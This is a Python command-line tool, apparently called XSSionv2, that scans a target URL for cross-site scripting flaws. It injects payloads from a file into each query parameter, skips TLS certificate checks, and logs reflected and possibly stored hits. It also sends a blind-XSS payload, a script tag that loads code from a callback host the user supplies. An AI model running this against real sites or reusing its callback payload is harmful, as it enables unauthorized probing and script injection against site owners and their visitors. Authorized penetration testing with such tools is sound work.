#!/usr/bin/env python3

import sys
import argparse
import requests
import urllib.parse
import time
import html
from termcolor import colored

requests.packages.urllib3.disable_warnings()

# ---------------- ASCII BANNER ----------------
def banner():
    print(colored(r"""
 ____ ___  _________ _________.___________    _______   
\   \/  / /   _____//   _____/|   \_____  \   \      \  
 \     /  \_____  \ \_____  \ |   |/   |   \  /   |   \ 
 /     \  /        \/        \|   /    |    \/    |    \
/___/\  \/_______  /_______  /|___\_______  /\____|__  /
      \_/        \/        \/             \/         \/ 
                                                                                          
        XSSionv2 – Advanced XSS Scanner
        Made by: @alhamrizvii
""", "red"))

# ---------------- ARGUMENTS ----------------
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Target URL with parameters")
parser.add_argument("-p", "--payloads", required=True, help="Payload file")
parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
parser.add_argument("-b", "--blind", help="Blind XSS callback URL (optional)")
parser.add_argument("--delay", type=int, default=0, help="Delay between requests")
args = parser.parse_args()

# ---------------- LOAD PAYLOADS ----------------
with open(args.payloads, "r", errors="ignore") as f:
    payloads = [x.strip() for x in f if x.strip()]

parsed = urllib.parse.urlparse(args.url)
params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

if not params:
    print(colored("[!] No parameters found in URL", "red"))
    sys.exit(1)

# ---------------- INFO ----------------
banner()
print(colored("[+] Target      :", "green"), args.url)
print(colored("[+] Parameters :", "green"), ", ".join(params.keys()))
print(colored("[+] Payloads   :", "green"), len(payloads))
print(colored("[+] Timeout    :", "green"), f"{args.timeout}s")
print(colored("[+] Blind XSS  :", "green"), args.blind if args.blind else "Disabled")
print(colored("-" * 65, "red"))

# ---------------- SCAN ----------------
def is_real_reflection(payload, response_text):
    return payload in response_text and html.escape(payload) not in response_text

start_time = time.time()
session = requests.Session()

for param in params:
    for payload in payloads:
        test_params = params.copy()
        test_params[param] = payload
        query = urllib.parse.urlencode(test_params, doseq=True)
        test_url = parsed._replace(query=query).geturl()

        print(colored(f"[TEST] {param} → {payload}", "yellow"))

        try:
            r = session.get(test_url, timeout=args.timeout, verify=False)

            # ---------------- REFLECTED XSS ----------------
            if is_real_reflection(payload, r.text):
                print(colored("[REFLECTED XSS] " + test_url, "red"))
                with open("XSSionv2_results.txt", "a") as out:
                    out.write(f"[REFLECTED] {test_url} | {payload}\n")

            # ---------------- STORED XSS (DELAYED CHECK) ----------------
            time.sleep(2)
            r2 = session.get(parsed.geturl(), timeout=args.timeout, verify=False)
            if is_real_reflection(payload, r2.text):
                print(colored("[POTENTIAL STORED XSS] " + test_url, "magenta"))
                with open("XSSionv2_results.txt", "a") as out:
                    out.write(f"[STORED?] {test_url} | {payload}\n")

        except Exception as e:
            print(colored(f"[ERROR] {e}", "cyan"))

        time.sleep(args.delay)

# ---------------- BLIND XSS ----------------
if args.blind:
    blind_payload = f'"><script src={args.blind}></script>'
    for param in params:
        test_params = params.copy()
        test_params[param] = blind_payload
        query = urllib.parse.urlencode(test_params, doseq=True)
        blind_url = parsed._replace(query=query).geturl()

        print(colored("[BLIND XSS SENT] " + blind_url, "blue"))
        try:
            session.get(blind_url, timeout=args.timeout, verify=False)
            with open("XSSionv2_results.txt", "a") as out:
                out.write(f"[BLIND] {blind_url}\n")
        except:
            pass

# ---------------- FINISH ----------------
end_time = time.time()
print(colored("-" * 65, "red"))
print(colored("[✓] Scan completed", "green"))
print(colored("[✓] Time taken :", "green"), f"{round(end_time - start_time, 2)}s")
print(colored("[✓] Results    :", "green"), "XSSionv2_results.txt")
